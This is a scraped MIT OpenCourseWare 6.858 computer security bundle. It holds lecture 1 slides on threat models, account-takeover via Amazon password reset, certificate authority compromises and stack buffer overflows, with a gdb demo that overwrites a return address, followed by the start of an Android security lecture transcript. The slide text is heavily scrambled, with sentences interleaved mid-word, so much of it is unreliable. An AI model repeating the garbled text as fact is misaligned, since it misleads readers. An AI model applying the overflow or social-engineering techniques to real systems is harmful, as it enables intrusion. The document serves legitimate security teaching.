 Address	&#13; can	&#13; be	&#13; easy,	&#13; but	&#13; how	&#13; to	&#13; get	&#13; 4	&#13; digits	&#13; of	&#13; user's	&#13; credit	&#13; card	&#13; 
Amazon:	&#13; can	&#13; add	&#13; a	&#13; credit	&#13; card	&#13; to	&#13; an	&#13; account,	&#13; no	&#13; password	&#13; required.	&#13; 
o number?	&#13; 
o Amazon	&#13; passnumbers.	&#13; word	&#13; reset:	&#13; provide	&#13; any	&#13; one	&#13; of	&#13; user's	&#13; credit	&#13; card	&#13; 
	&#13; Amazon:	&#13; will	&#13; not	&#13; print	&#13; credit	&#13; card	&#13; numbers.	&#13; But	&#13; will	&#13; print	&#13; last	&#13; 4	&#13; digits! 	&#13; 
Example:	&#13; Twitter's	&#13; @N	&#13; account	&#13; hijacking.	&#13; 
https://medium.com/p/24eb09e026dd
 Can	&#13; be	&#13; hard	&#13; for	&#13; legitimate	&#13; user	&#13; to	&#13; prove	&#13; they	&#13; o	&#13; 
	&#13; wn	&#13; an	&#13; account! 	&#13; 
How
 
 	&#13; to	&#13; 
Think	&#13; hard	&#13; about	&#13; implications	&#13; of	&#13; policy	&#13; statements.	&#13; solve? 	&#13; 
Some	&#13; policy	&#13; checking	&#13; tools	&#13; can	&#13; help,	&#13; but	&#13; need	&#13; a	&#13; way	&#13; to	&#13; specify	&#13; what's	&#13; bad.	&#13; 
2</text>
        </slide>
        <slide>
          <slideno>6</slideno>
          <text>What	&#13; does	&#13; the	&#13; compiler	&#13; generate	&#13; in	&#13; terms	&#13; of	&#13; memory	&#13; layout?
x86
	&#13; s
 tack:	&#13; 	&#13; 
 
 Stack	&#13; gr
%esp 	&#13; pointsows	&#13; down.
	&#13; to	&#13; the	&#13; las	&#13; 
 
                         %ebp	&#13; points	&#13; to	&#13; the	&#13; calt	&#13; (bottom
ler's	&#13; %esp-most)	&#13; valid	&#13; thing	&#13; on	&#13; the	&#13; stack.	&#13; 
+------------------	&#13; value. 	&#13; 
+ 
        entry %ebp ----&gt; | .. prev frame .. | 
                         |                  | 
                         |                  |                          +------------------+ 
        entry %esp ----&gt; |  return address  | 
                         +------------------+ 
        new %ebp ------&gt; |    saved %ebp    | 
                         +------------------+                          |        i         | 
                         +------------------+ 
                         |     buf[127]     |                          |       ...        | 
                         |      buf[0]      | 
                         +------------------+         new %esp ------&gt; |       ...        | 
                         
	&#13; 
	&#13; 	&#13; 	&#13; 	&#13; 
	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; Caller's	&#13; code	&#13; (say,	&#13; main):+------------------+ 
	&#13; 
	&#13; 	&#13; 	&#13; 	&#13; reacall read_req
d_req's	&#13; code: 	&#13;  	&#13; 
      push    %ebp 
      mov     %esp -&gt; %ebp 
      sub     168, %esp        # stack vars, etc 
      ...       mov     %ebp -&gt; %esp 
      pop     %ebp 
      
	&#13; 
How	&#13; does	&#13; ret
 
 Supply	&#13; long	&#13; input,	&#13; overthe	&#13;  
adversary	&#13; take	&#13; advantage	&#13; of	&#13; this	&#13; code? 	&#13; 
 CInter
an	&#13; set	&#13; return	&#13; address	&#13; to	&#13; the	&#13; buffer	&#13; itself,	&#13; include	&#13; some	&#13; code	&#13; in	&#13; there.esting	&#13; bit	&#13; of	&#13; data:	&#13; rwr
eturite	&#13; data	&#13; on	&#13; stack	&#13; past	&#13; buffer
n	&#13; address,	&#13; gets	&#13; used	&#13; by	&#13; 'ret'..	&#13; 
	&#13; 
	&#13; 	&#13; 
How
 
 	&#13; does	&#13; 
What	&#13; if	&#13; one	&#13; machine	&#13; has	&#13; twice	&#13; as	&#13; much	&#13; memory?the	&#13; adversary	&#13; know	&#13; the	&#13; address	&#13; of	&#13; the	&#13; buffer?
	&#13; 	&#13; 
 Lu
For	&#13; a	&#13; given	&#13; OS	&#13; and	&#13; program,	&#13; addresses	&#13; will	&#13; often	&#13; be	&#13; the	&#13; same.ckily	&#13; for	&#13; adversary,	&#13; virtual	&#13; memory	&#13; makes	&#13; things	&#13; more	&#13; deterministic.
	&#13; 	&#13; 
	&#13; 
7</text>
        </slide>
        <slide>
          <slideno>7</slideno>
          <text>What	&#13; h
 Look	&#13; at	&#13; the	&#13; stack	&#13; frame	&#13; for	&#13; gets.	&#13; appens	&#13; if	&#13; stack	&#13; grows	&#13; up,	&#13; instead	&#13; of	&#13; down? 	&#13; 
	&#13; 
What	&#13; c
 
 an	&#13; th
Use	&#13; any	&#13; prive	&#13; advers
ilar
eges	&#13; of	&#13; ty	&#13; do	&#13; onc
he	&#13; process.e	&#13; they	&#13; are
	&#13; 	&#13; executing	&#13; code? 	&#13; 
Often	&#13; leverage	&#13; overflow	&#13; to	&#13; gain	&#13; easier	&#13; access	&#13; into	&#13; system.	&#13; 
o 
 
 If	&#13; the	&#13; process	&#13; is	&#13; running	&#13; as	&#13; root	&#13; or	&#13; Administrator,	&#13; can	&#13; do	&#13; anything.	&#13; Originally	&#13; on	&#13; Unix,	&#13; run	&#13; shell	&#13; /bin/sh	&#13; (thus,	&#13; "shell	&#13; code"). 	&#13; 
 CEven	&#13; if	&#13; not,	&#13; can	&#13; still	&#13; send	&#13; spam,	&#13; read	&#13; 
an	&#13; attack	&#13; other	&#13; machines	&#13; behind	&#13; a	&#13; firewall.	&#13; files	&#13;  (web	&#13; server,	&#13; database),	&#13; etc. 	&#13; 
	&#13; 
Why	&#13; would	&#13; programmers	&#13; write	&#13; such	&#13; code?	&#13; 
 
 
 Leg
Programmers	&#13; were	&#13; not	&#13; thinking	&#13; about	&#13; security.	&#13; acy	&#13; code,	&#13; wasn't	&#13; exposed	&#13; to	&#13; the	&#13; internet. 	&#13; 
 ManyEven	&#13; s	&#13; s
aftand
e	&#13; verar
sd
ions	&#13; func
	&#13; have	&#13; gotchastions	&#13; used	&#13; to
	&#13; (s	&#13; be
tr	&#13; uns
ncpy	&#13; dafe	&#13; (
oesstr
	&#13; not	&#13; nullcpy,	&#13; gets,	&#13; spr
-terminate).	&#13; intf). 	&#13; 
	&#13; 
More	&#13; generally,	&#13; any	&#13; memory	&#13; errors	&#13; can	&#13; translate	&#13; into	&#13; a	&#13; vulnerability.	&#13; 
 Using	&#13; memory	&#13; after	&#13; it	&#13; has	&#13; been	&#13; deallocated	&#13; (use-
o o 
 If	&#13; reading,	&#13; might	&#13; call	&#13; a	&#13; corrupted	&#13; function	&#13; pointer.	&#13; If	&#13; writing,	&#13; overwrite	&#13; new	&#13; data	&#13; structure,	&#13; e.g.	&#13; fafte
unction	&#13; ptrr-free). 	&#13; 
.	&#13; 
Freeing	&#13; the	&#13; same	&#13; memory	&#13; twice	&#13; (double-
Decrementing	&#13; the	&#13; stack	&#13; ptr	&#13; past	&#13; the	&#13; endo 
 Might	&#13; cause	&#13; malloc	&#13; to	&#13; later	&#13; return	&#13; the	&#13; same	&#13; memory	&#13; twice.	&#13; free).	&#13; 
o http://www.invisiblethingslab.com/resources/misc-	&#13; of	&#13; stack,	&#13; into	&#13; some	&#13; other	&#13; memory.	&#13; 
 large -memory-attacks.pdf	&#13; 2010/xorg-
 A	&#13; one-byte	&#13; stray	&#13; write	&#13; can	&#13; lead	&#13; to	&#13; compromise.	&#13; Migho o t	&#13; nohttp://www.openwall.com/lists/oss-security/2014/08/26/2
o Cat	&#13; e
n	&#13; suve
ffice	&#13; n	&#13; nee
td
o	&#13; 	&#13; to
rea	&#13; o
d	&#13; ve
senrwr
sitite
ive	&#13; 	&#13; a	&#13; 
daret
tu
arn
	&#13; lik	&#13; a
e	&#13; ddress	&#13; 
an	&#13; encrypor	&#13; fu
	&#13; Ctnction	&#13; poin	&#13; 
ion	&#13; key. 	&#13; ter.	&#13; 
an	&#13; suffice	&#13; to	&#13; change	&#13; some	&#13; bits	&#13; (e.g.	&#13; int	&#13; isLoggedIn,	&#13; int	&#13; isRoot).	&#13; 
How	&#13; to	&#13; avoid	&#13; mechanism	&#13; problems?	&#13; 
 Reduce	&#13; the	&#13; amount	&#13; of	&#13; security-
o 
o Don't	&#13; rely	&#13; on	&#13; the	&#13; entirecritical
cati	&#13; code.
on	&#13; to	&#13; 
 Lab	&#13; 2.	&#13; 	&#13; appli 	&#13; enforce	&#13; security. 	&#13; 
Avoid	&#13; bugs	&#13; in	&#13; security-
o 
o E.g.,	&#13; don't	&#13; use	&#13; gets(),	&#13; use	&#13; fgets()	&#13; which	&#13; can	&#13; limit	&#13; buffer	&#13; length.	&#13; critical	&#13; code. 	&#13; 
o Use	&#13; common,	&#13; well-tested	&#13; security	&#13; mechanisms	&#13; ("Economy	&#13; of	&#13; 
o mechanism").	&#13; 
o Audit	&#13; these	&#13; common	&#13; security	&#13; mechanisms	&#13; (lots	&#13; of	&#13; incentive	&#13; to	&#13; do	&#13; so).	&#13; Avoid	&#13; developing	&#13; new,	&#13; one-off	&#13; mechanisms	&#13; that	&#13; may	&#13; have	&#13; bugs.	&#13; 
 Good	&#13; mechanism	&#13; supports	&#13; many	&#13; uses,	&#13; policies	&#13; (more	&#13; incentive	&#13; to	&#13; audit). 	&#13; 
Examples	&#13; of	&#13; common	&#13; mechanisms:	&#13; 
8</text>
        </slide>
        <slide>
          <slideno>8</slideno>
          <text>o 
o 
o OS
net-
wle
orkvel	&#13; ac
	&#13; firewcess
a	&#13; c
cryptography,	&#13; cryptllo
s	&#13; (bntr
utol	&#13; (
,	&#13; coulbut,	&#13; c
ographic	&#13; protd	&#13; oftould
en	&#13; b	&#13; of
e	&#13; bten	&#13; be
etter)	&#13; be
	&#13; tter)	&#13; 
ocols. 	&#13; 
9</text>
        </slide>
        <slide>
          <slideno>0</slideno>
          <text>6.858	&#13; Lecture	&#13; 1 	&#13; 
Admin
	&#13; 
Lab	&#13; 1	&#13; istrivia:	&#13; 
how	&#13; to	&#13; getout	&#13; today:	&#13; buffer	&#13; overflows.	&#13; 	&#13; Start	&#13; early.	&#13; Next	&#13; week,	&#13; there	&#13; will	&#13; be	&#13; tutorials	&#13; on	&#13; 
Int	&#13; 
Wh	&#13; r
at	&#13; iod
su
	&#13; sct
ei	&#13; st
on:art
	&#13; ed	&#13; with	&#13; lab	&#13; 1,	&#13; during	&#13; office	&#13; hours.	&#13; 
 Achieving	&#13; some	&#13; goal	&#13; in	&#13; the	&#13; presence	&#13; of	&#13; an	&#13; curity? 	&#13; 
	&#13; adversary.	&#13; 
Many	&#13; systems	&#13; are	&#13; connected	&#13; to	&#13; the	&#13; Internet,	&#13; which	&#13; has	&#13; adversaries.	&#13; Thus,	&#13; design	&#13; of	&#13; 
many	&#13; systems	&#13; might	&#13; need	&#13; to	&#13; address	&#13; security,	&#13; i.e.	&#13; will	&#13; the	&#13; system	&#13; work	&#13; when	&#13; there's	&#13; 
an	&#13; adversary?
Hig	&#13; 	&#13; 
h

-le
  vel	&#13; plan	&#13; for	&#13; thinki
 CPol
ommon	&#13; goals:	&#13; confidentiality,	&#13; integrity,	&#13; availability.icy:	&#13; the	&#13; goal	&#13; you	&#13; want	&#13; to	&#13; achieve.	&#13; e.g.	&#13; only	&#13; Alice	&#13; should	&#13; read	&#13; file	&#13; F.ng	&#13; about	&#13; security: 	&#13; 
	&#13; 	&#13; 
Threat	&#13; model:	&#13; assumptions	&#13; about	&#13; what	&#13; the	&#13; attacker	&#13; could	&#13; do.	&#13; e.g.	&#13; can	&#13; guess	&#13; 
 pas
assuming	&#13; attacker	&#13; can	&#13; do	&#13; something.swords,	&#13; cannot	&#13; physically	&#13; grab	&#13; file	&#13; s
	&#13; erver.	&#13; Better	&#13; to	&#13; err	&#13; on	&#13; the	&#13; side	&#13; of	&#13; 
 Mechanism:	&#13; knobs	&#13; that	&#13; your	&#13; system	&#13; provides	&#13; to	&#13; help	&#13; uphold	&#13; policy.	&#13; e.g.	&#13; user	&#13; 
accounts,	&#13; passwords,	&#13; file	&#13; permissions,	&#13; encryption.
Resulting	&#13; goal:	&#13; no	&#13; way	&#13; for	&#13; adversary	&#13; within	&#13; threat	&#13; model	&#13; to	&#13; violate	&#13; policy.	&#13; 	&#13; 
	&#13; Note	&#13; that	&#13; goal	&#13; has	&#13; nothing	&#13; to	&#13; say	&#13; about	&#13; mechanism.	&#13; 
Why
 
 	&#13; is	&#13; s
Need	&#13; to	&#13; guarantee	&#13; policy,	&#13; assuming	&#13; the	&#13; threat	&#13; model.ecurity	&#13; hard?	&#13; 	&#13; Negative	&#13; goal. 	&#13; 
 Difficult	&#13; to	&#13; think	&#13; of	&#13; all	&#13; possible	&#13; ways	&#13; that	&#13; attacker	&#13; might	&#13; break	&#13; in.	&#13; 
 Realistic	&#13; threat	&#13; models	&#13; are	&#13; openContrast:	&#13; easy	&#13; to	&#13; check	&#13; whether	&#13; a	&#13; positive	&#13; goal	&#13; is	&#13; upheld,	&#13; e.g.	&#13; Alice	&#13; can	&#13; -ended	&#13; (almost	&#13; negative	&#13; models).	&#13; 
	&#13; 
  Weakest	&#13; link	&#13; matters.actually	&#13; read	&#13; file	&#13; F. 	&#13; 
Iterative	&#13; process:	&#13; design,	&#13; update	&#13; threat	&#13; model	&#13; as	&#13; necessary,	&#13; etc.	&#13; 
	&#13; 	&#13; 
Wh
boundary	&#13; of	&#13; each	&#13; system	&#13; to	&#13; see	&#13; when	&#13; it	&#13; breaks.at'
 s	&#13; the	&#13; point	&#13; if	&#13; we	&#13; can't	&#13; achieve	&#13; perfect	&#13; secur
	&#13; ity?	&#13; In	&#13; this	&#13; class,	&#13; we'll	&#13; push	&#13; the	&#13; 
 
 Each	&#13; system	&#13; will	&#13; likely	&#13; have	&#13; some	&#13; breaking	&#13; point	&#13; leading	&#13; to	&#13; compromise.Doesn't	&#13; necessarily	&#13; mean	&#13; the	&#13; system	&#13; is	&#13; not	&#13; useful:	&#13; depends	&#13; on	&#13; context.	&#13; 	&#13; 
	&#13; 	&#13; Important	&#13; to	&#13; understand	&#13; what	&#13; a	&#13; system	&#13; can	&#13; do,	&#13; and	&#13; what	&#13; a	&#13; system	&#13; cannot.	&#13; 
In	&#13; reality,	&#13; must	&#13; manage	&#13; security	&#13; risk	&#13; vs.	&#13; benefit.
 More	&#13; secure	&#13; systems	&#13; means	&#13; less	&#13; risk	&#13; (or	&#13; consequence)	&#13; of	&#13; some	&#13; 	&#13; 
compromises.	&#13; 
1</text>
        </slide>
        <slide>
          <slideno>2</slideno>
          <text>Difficult	&#13; in	&#13; distributed	&#13; systems:	&#13; don't	&#13; know	&#13; what	&#13; everyone	&#13; is	&#13; doing.	&#13; 
	&#13; 
What	&#13; goes	&#13; wrong	&#13; #2:	&#13; problems	&#13; with	&#13; threat	&#13; model	&#13; /	&#13; assumptions.	&#13;  
	&#13; 
Example:	&#13; human	&#13; factors	&#13; not	&#13; accounted	&#13; for,	&#13; ex.	&#13; 
 
 User	&#13; gets	&#13; email	&#13; asking	&#13; to	&#13; renew	&#13; email	&#13; account,	&#13; transfer	&#13; money,	&#13; or	&#13; ...	&#13; Phishing	&#13; attacks. 	&#13; 
 Tech	&#13; support	&#13; gets	&#13; call	&#13; from	&#13; convincing-
"Rubberhose 	&#13; cryptanalysis".	&#13; sounding	&#13; user	&#13; to	&#13; reset	&#13; password. 	&#13; 
	&#13; 
Example:	&#13; computational	&#13; assumptions	&#13; change	&#13; over	&#13; time.	&#13; 
 
 
 MIT's	&#13; Kerberos	&#13; system	&#13; used	&#13; 56-bit	&#13; DES	&#13; keys,	&#13; since	&#13; mid-1980's. 	&#13; 
	&#13;  At	&#13; the	&#13; time,	&#13; seemed	&#13; fine	&#13; to	&#13; assume	&#13; adversary	&#13; can't	&#13; check	&#13; all	&#13; 2^56	&#13; keys.	&#13; 
 No	&#13; https:/longer	&#13; 
/www.cloureasona
dcracker.com/dictionaries.htmlble:	&#13; now	&#13; costs	&#13; about	&#13; $100. 	&#13; 
Several	&#13; years	&#13; ago,	&#13; 6.858	&#13; final	&#13; project	&#13; showed	&#13;  you	&#13; can	&#13; get	&#13; 
	&#13; any	&#13; key	&#13; in	&#13; a	&#13; day. 	&#13; 
Example:	&#13; all	&#13; SSL	&#13; certificate	&#13; C
 To	&#13; connect
o 	&#13; to	&#13; an	&#13; SSL -enaAs	&#13; are	&#13; fully	&#13; trusted.	&#13; 
bled	&#13; web	&#13; site,	&#13; web	&#13; browser	&#13; verifies	&#13; certificate. 	&#13; 
 Cert
keificate	&#13; is 	&#13; a	&#13; combination	&#13; of	&#13; server's	&#13; host	&#13; name	&#13; and	&#13; cryptographic	&#13; 
 Long	&#13; list	&#13; (hundreds)	&#13; of	&#13; certificate	&#13; authorities	&#13; trusted	&#13; by	&#13; most	&#13; browsers.	&#13; y,	&#13; signed	&#13; by	&#13; some	&#13; trusted	&#13; certificate	&#13; authority	&#13; (CA).	&#13; 
 If	&#13; any	&#13; C
"fake"	&#13; certificate	&#13; for	&#13; any	&#13; server	&#13; host	&#13; name.	&#13; A	&#13; is	&#13; compromised,	&#13; adversary	&#13; can	&#13; intercept	&#13; SSL	&#13; connections	&#13; with	&#13; a	&#13; 
In	&#13; 2011,	&#13; two	&#13; C(googl
o e,	&#13; yaAs	&#13; were	&#13; compromised,	&#13; issued	&#13; fake	&#13; certs	&#13; for	&#13; many	&#13; domains	&#13; 
o 
 hthtttp://ep://en.whoo,	&#13; t
n.wikipedia.oror,	&#13; ...),	&#13; apparent
g/wiki/Dly	&#13; used	&#13; in	&#13; Ira
igiNotarn	&#13; (?
	&#13; ).	&#13; 
In	&#13; 2012,	&#13; a	&#13; C
o A	&#13; inadvertently	&#13; issued	&#13; a	&#13; root	&#13; certificate	&#13; valid	&#13; for	&#13; any	&#13; domain.	&#13; ikipedia.org/wiki/Comodo_Group	&#13; 
htman-tp://w
	&#13; in-thw
ew
-m.h
iddl-online.com/security/news/item/Trustwave-
e-certificate -1429982.html	&#13; issued-a-
Example:	&#13; assuming	&#13; your	&#13; hardware	&#13; is	&#13; trustworthy.	&#13; 
 If	&#13; NSA	&#13; is	&#13; your	&#13; adversary,	&#13; turns	&#13; out	&#13; to	&#13; not	&#13; be	&#13; a	&#13; good	&#13; assumption.	&#13; 
o https://www.schneier.com/blog/archives/2013/12/more_about_the.
	&#13; html	&#13; 
Example:	&#13; assuming	&#13; good	&#13; randomness	&#13; for	&#13; cryptography.	&#13; 
 Need	&#13; 
o high
o 
Problem:	&#13; embedded	&#13; devices,	&#13; virtual	&#13; machines	&#13; may	&#13; not	&#13; have	&#13; much	&#13; 
randomness.	&#13; -quality	&#13; randomness	&#13; to	&#13; generate	&#13; the	&#13; keys	&#13; that	&#13; can't	&#13; be	&#13; guessed.	&#13; 
As	&#13; a	&#13; result,	&#13; many	&#13; keys	&#13; are	&#13; similar	&#13; or	&#13; susceptible	&#13; to
	&#13;  https://factorable.net/weakkeys12.extended.pdf 	&#13; guessing	&#13; attacks.	&#13; 
Example:	&#13; subverting	&#13; milita
 In	&#13; the	&#13; 80's,	&#13; military	&#13; encouraged	&#13; research	&#13; into	&#13; secure	&#13; OS'es.	&#13; ry	&#13; OS	&#13; security.	&#13; 
3</text>
        </slide>
        <slide>
          <slideno>5</slideno>
          <text>Demo	&#13; to	&#13; go	&#13; along	&#13; with	&#13; the	&#13; discussion	&#13; below:	&#13; 
	&#13; 
    % make 
    % ./readreq     1234 
    % ./readreq 
    12341234123412341234 
    % ./readreq 
    AAAAAAAAAAAA....AAAA     % gdb ./readreq 
    b read_req 
    r     disas $eip 
    info reg 
    print &amp;buf[0]     x $ebp 
    x $ebp+4 
    disas 0x08048e5f 
    next 
     AAAAAAA...AAA 
    print &amp;buf[0] 
    x $ebp     x $ebp+4 
    next 
     print &amp;buf[0]   ## why just 128 bytes now? 
    x $ebp 
    x $ebp+4  
    disas $eip 
    nexti 
    nexti 
    disas $eip     info reg 
    x $esp 
    stepi     stepi 
 
    ..     disas main 
    set {int}$esp = 0x..  ##from main 
    c 
	&#13; 
	&#13; 
	&#13; 
	&#13; 
6</text>
        </slide>
        <slide>
          <slideno>9</slideno>
          <text>MIT OpenCourseWare
http://ocw.mit.edu
6.858 Computer Systems Security
Fall 2014
For information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms.</text>
        </slide>
      </slides>
      <videos>
        <video>
          <video_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/lecture-20-mobile-phone-security/</video_url>
          <video_title>Lecture 20: Mobile Phone Security</video_title>
          <transcript>
            <slice>
              <time_slice>0:00</time_slice>
              <text_slice>The following content is
provided under a Creative</text_slice>
            </slice>
            <slice>
              <time_slice>0:02</time_slice>
              <text_slice>Commons license.</text_slice>
            </slice>
            <slice>
              <time_slice>0:03</time_slice>
              <text_slice>Your support will help
MIT OpenCourseWare</text_slice>
            </slice>
            <slice>
              <time_slice>0:06</time_slice>
              <text_slice>continue to offer high-quality
educational resources for free.</text_slice>
            </slice>
            <slice>
              <time_slice>0:10</time_slice>
              <text_slice>To make a donation or to
view additional materials</text_slice>
            </slice>
            <slice>
              <time_slice>0:12</time_slice>
              <text_slice>from hundreds of MIT courses,
visit MIT OpenCourseWare</text_slice>
            </slice>
            <slice>
              <time_slice>0:16</time_slice>
              <text_slice>at ocw.mit.edu.</text_slice>
            </slice>
            <slice>
              <time_slice>0:27</time_slice>
              <text_slice>PROFESSOR: All right.</text_slice>
            </slice>
            <slice>
              <time_slice>0:28</time_slice>
              <text_slice>Let's get started.</text_slice>
            </slice>
            <slice>
              <time_slice>0:30</time_slice>
              <text_slice>So today we're going to talk
about Android security, which</text_slice>
            </slice>
            <slice>
              <time_slice>0:33</time_slice>
              <text_slice>is-- you can sort of think
of it as an interesting case</text_slice>
            </slice>
            <slice>
              <time_slice>0:36</time_slice>
              <text_slice>study of a system
that was designed</text_slice>
            </slice>
            <slice>
              <time_slice>0:39</time_slice>
              <text_slice>with quite a bit
of attention paid</text_slice>
            </slice>
            <slice>
              <time_slice>0:41</time_slice>
              <text_slice>to security in the first place.</text_slice>
            </slice>
            <slice>
              <time_slice>0:42</time_slice>
              <text_slice>So this is perhaps in contrast
to many of the systems</text_slice>
            </slice>
            <slice>
              <time_slice>0:45</time_slice>
              <text_slice>we've looked at
so far, like Unix,</text_slice>
            </slice>
            <slice>
              <time_slice>0:47</time_slice>
              <text_slice>or the web, browsers,
where security</text_slice>
            </slice>
            <slice>
              <time_slice>0:51</time_slice>
              <text_slice>was in many ways bolted
on after the fact</text_slice>
            </slice>
            <slice>
              <time_slice>0:54</time_slice>
              <text_slice>and wasn't really designed
in quite the same way</text_slice>
            </slice>
            <slice>
              <time_slice>0:57</time_slice>
              <text_slice>as you see in this paper,
where these guys who</text_slice>
            </slice>
            <slice>
              <time_slice>1:00</time_slice>
              <text_slice>designed the Android
were very worried</text_slice>
            </slice>
            <slice>
              <time_slice>1:01</time_slice>
              <text_slice>about particular
classes of attacks,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03</time_slice>
              <text_slice>and constructive mechanisms.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05</time_slice>
              <text_slice>Then figured out a better way
of structuring applications</text_slice>
            </slice>
            <slice>
              <time_slice>1:08</time_slice>
              <text_slice>that is going to allow us
to enforce security policies</text_slice>
            </slice>
            <slice>
              <time_slice>1:12</time_slice>
              <text_slice>in a better way in Android.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15</time_slice>
              <text_slice>And the cool thing about
it is that it's actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:18</time_slice>
              <text_slice>a pretty widely used system.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20</time_slice>
              <text_slice>So unlike some
research papers that</text_slice>
            </slice>
            <slice>
              <time_slice>1:22</time_slice>
              <text_slice>might propose a
new architecture,</text_slice>
            </slice>
            <slice>
              <time_slice>1:24</time_slice>
              <text_slice>this actually gets
used in practice.</text_slice>
            </slice>
            <slice>
              <time_slice>1:26</time_slice>
              <text_slice>And there's lots and lots of
Android devices out there.</text_slice>
            </slice>
            <slice>
              <time_slice>1:28</time_slice>
              <text_slice>And we can talk about how well
some things have worked out,</text_slice>
            </slice>
            <slice>
              <time_slice>1:31</time_slice>
              <text_slice>how well some things
didn't pan out.</text_slice>
            </slice>
            <slice>
              <time_slice>1:34</time_slice>
              <text_slice>But we will, I
guess, look at what</text_slice>
            </slice>
            <slice>
              <time_slice>1:38</time_slice>
              <text_slice>parts of the design they
thought were important,</text_slice>
            </slice>
            <slice>
              <time_slice>1:41</time_slice>
              <text_slice>what did they miss, what,
in practice, turns out</text_slice>
            </slice>
            <slice>
              <time_slice>1:44</time_slice>
              <text_slice>to matter or not.</text_slice>
            </slice>
            <slice>
              <time_slice>1:46</time_slice>
              <text_slice>But it's kind of interesting.</text_slice>
            </slice>
            <slice>
              <time_slice>1:47</time_slice>
              <text_slice>In some ways, it also
uses existing systems</text_slice>
            </slice>
            <slice>
              <time_slice>1:49</time_slice>
              <text_slice>that we've talked about.</text_slice>
            </slice>
            <slice>
              <time_slice>1:50</time_slice>
              <text_slice>So Android is built
on top of Unix.</text_slice>
            </slice>
            <slice>
              <time_slice>1:53</time_slice>
              <text_slice>It's just a Linux kernel running
underneath the entire phone.</text_slice>
            </slice>
            <slice>
              <time_slice>1:58</time_slice>
              <text_slice>So in many ways, they use some
of the familiar mechanisms</text_slice>
            </slice>
            <slice>
              <time_slice>2:01</time_slice>
              <text_slice>you guys have seen
in Lab 2 already,</text_slice>
            </slice>
            <slice>
              <time_slice>2:03</time_slice>
              <text_slice>where you use Unix user IDs
and groups and all these things</text_slice>
            </slice>
            <slice>
              <time_slice>2:07</time_slice>
              <text_slice>to separate applications
from one another.</text_slice>
            </slice>
            <slice>
              <time_slice>2:09</time_slice>
              <text_slice>But in Android's case, they
have a very different way</text_slice>
            </slice>
            <slice>
              <time_slice>2:12</time_slice>
              <text_slice>of setting up user IDs
and file permissions,</text_slice>
            </slice>
            <slice>
              <time_slice>2:15</time_slice>
              <text_slice>et cetera, than in a
typical Linux system.</text_slice>
            </slice>
            <slice>
              <time_slice>2:20</time_slice>
              <text_slice>So I guess let's
start out by talking</text_slice>
            </slice>
            <slice>
              <time_slice>2:23</time_slice>
              <text_slice>about what is the threat level?</text_slice>
            </slice>
            <slice>
              <time_slice>2:25</time_slice>
              <text_slice>What are these guys
worried about on a phone?</text_slice>
            </slice>
            <slice>
              <time_slice>2:28</time_slice>
              <text_slice>What's going on?</text_slice>
            </slice>
            <slice>
              <time_slice>2:29</time_slice>
              <text_slice>What are they trying
to protect against?</text_slice>
            </slice>
            <slice>
              <time_slice>2:31</time_slice>
              <text_slice>What's the threat model?</text_slice>
            </slice>
            <slice>
              <time_slice>2:34</time_slice>
              <text_slice>Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>2:34</time_slice>
              <text_slice>AUDIENCE: Applications that
want to do malicious things?</text_slice>
            </slice>
            <slice>
              <time_slice>2:37</time_slice>
              <text_slice>PROFESSOR: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>2:37</time_slice>
              <text_slice>So they worry
about-- I guess there</text_slice>
            </slice>
            <slice>
              <time_slice>2:39</time_slice>
              <text_slice>was these applications that
are going to run on the phone.</text_slice>
            </slice>
            <slice>
              <time_slice>2:41</time_slice>
              <text_slice>And they might be malicious.</text_slice>
            </slice>
            <slice>
              <time_slice>2:44</time_slice>
              <text_slice>And I guess there's-- well,
that there's outright malicious</text_slice>
            </slice>
            <slice>
              <time_slice>2:48</time_slice>
              <text_slice>applications that are
just out to get you,</text_slice>
            </slice>
            <slice>
              <time_slice>2:51</time_slice>
              <text_slice>maybe steal your private data.</text_slice>
            </slice>
            <slice>
              <time_slice>2:53</time_slice>
              <text_slice>So things you might worry
about-- there's data,</text_slice>
            </slice>
            <slice>
              <time_slice>2:56</time_slice>
              <text_slice>there's things that
might cost money,</text_slice>
            </slice>
            <slice>
              <time_slice>2:58</time_slice>
              <text_slice>like sending an SMS message
maybe, or making a phone call.</text_slice>
            </slice>
            <slice>
              <time_slice>3:02</time_slice>
              <text_slice>There's maybe using the
internet, et cetera.</text_slice>
            </slice>
            <slice>
              <time_slice>3:06</time_slice>
              <text_slice>So these are the,
presumably, things</text_slice>
            </slice>
            <slice>
              <time_slice>3:07</time_slice>
              <text_slice>you want to guard against
or protect on your phone.</text_slice>
            </slice>
            <slice>
              <time_slice>3:10</time_slice>
              <text_slice>And then there's
things that go wrong.</text_slice>
            </slice>
            <slice>
              <time_slice>3:12</time_slice>
              <text_slice>So presumably, there's
malicious applications,</text_slice>
            </slice>
            <slice>
              <time_slice>3:14</time_slice>
              <text_slice>because these guys want to
allow users to install apps</text_slice>
            </slice>
            <slice>
              <time_slice>3:18</time_slice>
              <text_slice>written by developers
that Google has never</text_slice>
            </slice>
            <slice>
              <time_slice>3:20</time_slice>
              <text_slice>heard of themselves.</text_slice>
            </slice>
            <slice>
              <time_slice>3:22</time_slice>
              <text_slice>Or it might be that apps just
have bugs themselves, that you</text_slice>
            </slice>
            <slice>
              <time_slice>3:26</time_slice>
              <text_slice>have a well-meaning
developer, but they</text_slice>
            </slice>
            <slice>
              <time_slice>3:28</time_slice>
              <text_slice>forget to do something.</text_slice>
            </slice>
            <slice>
              <time_slice>3:29</time_slice>
              <text_slice>And it would be nice
to help these guys</text_slice>
            </slice>
            <slice>
              <time_slice>3:31</time_slice>
              <text_slice>as well to build applications
that remain secure</text_slice>
            </slice>
            <slice>
              <time_slice>3:34</time_slice>
              <text_slice>despite the fact that
the app developer isn't</text_slice>
            </slice>
            <slice>
              <time_slice>3:37</time_slice>
              <text_slice>an expert in exactly every
kind of vulnerability</text_slice>
            </slice>
            <slice>
              <time_slice>3:40</time_slice>
              <text_slice>that might be exploited
in their application.</text_slice>
            </slice>
            <slice>
              <time_slice>3:45</time_slice>
              <text_slice>So one thing we could
do is, actually, we</text_slice>
            </slice>
            <slice>
